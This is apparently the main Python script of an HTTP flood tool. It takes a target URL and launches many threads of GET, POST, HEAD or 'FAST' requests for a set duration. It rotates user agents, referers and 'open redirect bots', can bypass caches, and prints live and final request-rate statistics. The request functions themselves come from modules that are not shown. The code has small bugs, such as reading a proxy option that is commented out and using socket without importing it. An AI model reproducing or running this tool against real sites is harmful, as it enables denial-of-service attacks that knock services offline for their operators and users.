import sys

try:
  import argparse
except Exception as e:
  print('[ERROR] Failed to import argparse, aborting.')
  debug = False

if len(sys.argv) <= 1:
  sys.exit('[ERROR] No/Invalid arguments supplied.')
else:
  parser = argparse.ArgumentParser(prog=sys.argv[0], usage='%(prog)s [options] -t http://targetdomain.com', allow_abbrev=False)
  parser.add_argument('-t',   '--target',       dest = 'target',       default = None,     help='Target URL (Example: https://google.com or http://pornhub.com)', type=str)
  parser.add_argument('-p',   '--port',         dest = 'port',         default = None,     help='Target port (Leave empty to let the tool decide)', type=str)
  parser.add_argument('-d',   '--duration',     dest = 'duration',     default = 10,       help='Attack duration', type=int)
  #parser.add_argument(        '--proxy',        dest = 'proxy',        default = None,     help='Use a proxy when attacking, SOCKS5 by default (Example: 127.0.0.1:1337)', type=str)
  #parser.add_argument(        '--proxy-type',   dest = 'proxy_type',   default = 'SOCKS5', help='Set the proxy type (SOCKS4 or SOCKS5)', type=str)
  parser.add_argument('-ua',  '--user-agent',   dest = 'useragent',    default = None,     help='User agent to use when attacking, else its dynamic', type=str)
  parser.add_argument('-ref', '--referer',      dest = 'referer',      default = None,     help='Referer to use when attacking, else its dynamic', type=str)
  parser.add_argument('-w',   '--workers',      dest = 'workers',      default = 100,      help='Amount of workers/threads to use when attacking', type=int)
  parser.add_argument('-dbg', '--debug',        dest = 'debug',        default = False,    help='Print info for devs', action='store_true')
  parser.add_argument('-bc',  '--bypass-cache', dest = 'bypass_cache', default = False,    help='Bypass the cache of the site', action='store_true')
  parser.add_argument('-m',   '--method',       dest = 'method',       default = 'GET',    help='Method to use when attacking (default: GET)', type=str)
  args = vars(parser.parse_args())

  debug = args['debug']

try:
  from timeit import default_timer as timer
except:
  print('[WARN] Failed to import timeit, debug mode disabled.')
  debug = False

# Import modules
# This is just to test if we have them all
print('[INFO] Importing modules, hold on.')
try:
  if debug: s_start = timer()
  import os
  import threading
  import json
  #import socks, socket # pysocks is outdated
  import time
  import requests
  from colorama import Fore, init
  from random import randint, choice
  from urllib.parse import urlparse
  if debug: 
    s_took = "%.2f" % (1000 * (timer() - s_start))
    print(f'[DEBUG] Importing modules took {str(s_took)} ms.')
  else:
    print('[INFO] Modules imported.')
except Exception as e:
  print('[ERROR] Failed to import modules, aborting. Please consider "python3 -m pip install -r requirements.txt"')
  if debug: print(f'\n[DEBUG] Stacktrace: \n{str(e).strip()}')
  exit()

# Import depencies
print('[INFO] Importing depencies, hold on.')
try:
  if debug: s_start = timer()
  from src.utils import *
  from src.attacks import *
  from src.core import *
  if debug: 
    s_took = "%.2f" % (1000 * (timer() - s_start))
    print(f'[DEBUG] Importing depencies took {str(s_took)} ms.')
  else:
    print('[INFO] Depencies imported.')
except Exception as e:
  print('[ERROR] Failed to import depencies, aborting.')
  if debug: print(f'\n[DEBUG] Stacktrace: \n{str(e).strip()}')
  exit()

method_dict = {
  'GET': http_get,
  'POST': http_post,
  'HEAD': http_head,
  'FAST': http_fast
}
if args['target'] is None:
  sys.exit('[ERROR] No target specified.')

Core.bypass_cache = args['bypass_cache']

if not args['method'] in method_dict.keys():
    sys.exit('[ERROR] Invalid method')

init() # initialize console
print_lock = threading.Lock() # creates a "lock" variable

def main():
  print('\n')
  with open('src/banner.txt', 'r') as fd:
    [print(line.strip('\n')) for line in fd.readlines()]
  
  print('\n')
  print(f' Target : [{args["target"]}]')
  print(f' Method: [{args["method"]}]')
  print(f' Duration: [{str(args["duration"])}]')
  print(f' Workers: [{str(args["workers"])}]')

  print('\n')

  if args['proxy'] != None:
    print(f' Proxy: [{str(args["proxy"])}]')
  
  if args['useragent'] is None:
    if debug: s_start = timer()
    print(f' User Agents: [{str(len(ualist))}]')
    if debug: 
      s_took = "%.2f" % (1000 * (timer() - s_start))
      print(f' [DEBUG] Importing user agents took {str(s_took)} ms.')
    
  if args['referer'] is None:
    if debug: s_start = timer()
    print(f' Referers: [{str(len(reflist)+len(orlist))}]')
    if debug: 
      s_took = "%.2f" % (1000 * (timer() - s_start))
      print(f' [DEBUG] Importing referers took {str(s_took)} ms.')
  
  if debug: s_start = timer()
  print(f' Open Redirect bots: [{str(len(orlist))}]')
  if debug:
    s_took = "%.2f" % (1000 * (timer() - s_start))
    print(f' [DEBUG] Importing open redirect bots took {str(s_took)} ms.')
  
  if debug: s_start = timer()
  print(f' Keywords: [{str(len(keywords))}]')
  if debug:
    s_took = "%.2f" % (1000 * (timer() - s_start))
    print(f' [DEBUG] Importing keywords took {str(s_took)} ms.')

def attack():
  session = createsession()
  parsed = urlparse(str(args['target']))
  resolved_host = socket.gethostbyname(str(parsed.netloc)) if (not isIPv4(parsed.netloc) and not isIPv6(parsed.netloc) and not parsed.netloc.endswith('.onion')) else parsed.netloc

  if isIPv6(resolved_host):
    resolved_host = f'[{resolved_host}]'

  s_start = timer() # timer used for counting avg rps
  for i in range(int(args['workers'])):
    Core.infodict.update({str(i): {'req_sent': 0, 'req_fail': 0, 'req_total':0}})
    kaboom = threading.Thread(target=method_dict[args['method']], args=(str(i), session, f'{parsed.scheme}://{resolved_host}', args['duration'], ))
    kaboom.start()
    Core.threadbox.append(kaboom)
    Core.threadcount += 1
  
  for kaboom in Core.threadbox:
    kaboom.join()
  
  Core.attackrunning = False
  s_took = "%.2f" % (timer() - s_start) # how long it took for the attack to finish
  total_rqs = 0
  for workerkey, workervalue in Core.infodict.items():
    total_rqs += workervalue['req_sent']

  Core.attack_length = s_took
  Core.avg_rps = float(total_rqs)/float(s_took)

if __name__ == '__main__':
  if not debug: clear()
  main()

  input('\nReady? (press enter) ')

  threading.Thread(target=attack).start()
  Core.attackrunning = True
  time.sleep(5)
  clear()

  worker_amount = 20 if args['workers'] > 20 else args['workers']
  while Core.attackrunning:
    try:

      info_dict = calcbestworkers()
      i = 0
      for workerkey, workervalue in info_dict.items():
        if i >= 20: continue
        i += 1
      
        req_sent = str(workervalue['req_sent'])
        req_fail = str(workervalue['req_fail'])
        req_total = str(workervalue['req_total'])

        with print_lock:
          print(f'[INFO] [{workerkey}] req_sent={req_sent} req_fail={req_fail} req_total={req_total} thread_count={str(Core.threadcount)}')
    except KeyboardInterrupt:
      with print_lock:
        print('Ciao!')
      Core.attackrunning = False
    except Exception:
      Core.attackrunning = False
    time.sleep(2)

    if Core.attackrunning: 
      clear()
  
  # calculate results
  total_req_sent = 0
  total_req_fail = 0
  total_req = 0
  for workerkey, workervalue in Core.infodict.items():
    total_req_sent += workervalue['req_sent']
    total_req_fail += workervalue['req_fail']
    total_req += workervalue['req_total']

  print('\n[INFO] Results: ')
  print(f'   Requests sent: {str(total_req_sent)}')
  print(f'   Requests failed: {str(total_req_fail)}')
  print(f'   Requests total: {str(total_req)}')
  print(f'   Attack took: {str(Core.attack_length)}')
  print(f'   Average requests per second: {str(Core.avg_rps)}')